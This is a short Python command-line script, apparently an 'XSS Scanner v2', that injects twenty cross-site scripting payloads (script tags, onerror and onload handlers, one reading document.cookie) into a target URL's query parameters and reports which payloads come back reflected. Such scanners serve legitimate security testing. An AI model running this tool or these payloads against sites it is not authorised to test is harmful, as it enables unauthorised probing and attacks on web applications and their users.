#!/usr/bin/env python3
import requests
import sys
import json
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor

PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<img src=x onerror=alert(document.cookie)>',
    '<script>alert(document.domain)</script>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<svg><script>alert(1)</script></svg>',
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
]

def test_payload(url, param, payload):
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        r = requests.get(new_url, timeout=5)
        if payload in r.text:
            return {'param': param, 'payload': payload, 'url': new_url, 'status': 'REFLECTED'}
    except:
        pass
    return None

def scan_xss(url, save_report=True):
    print(f"\n{'='*60}")
    print(f"  XSS Scanner v2")
    print(f"  Target: {url}")
    print(f"{'='*60}\n")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[-] No parameters found")
        return []
    
    print(f"[*] Testing {len(params)} parameter(s) with {len(PAYLOADS)} payloads...\n")
    
    found = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = []
        for param in params:
            for payload in PAYLOADS:
                futures.append(ex.submit(test_payload, url, param, payload))
        for future in futures:
            result = future.result()
            if result:
                found.append(result)
                print(f"  [!] {result['status']} on '{result['param']}'")
                print(f"      Payload: {result['payload'][:60]}")
                print(f"      URL: {result['url'][:100]}\n")
    
    print(f"\n  Found: {len(found)} potential XSS\n")
    
    if save_report and found:
        filename = f"xss_report_{parsed.hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump({'url': url, 'time': str(datetime.now()), 'findings': found}, f, indent=2)
        print(f"[+] Report saved: {filename}\n")
    
    return found

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 xss_scanner_v2.py <url>")
        sys.exit(1)
    scan_xss(sys.argv[1])
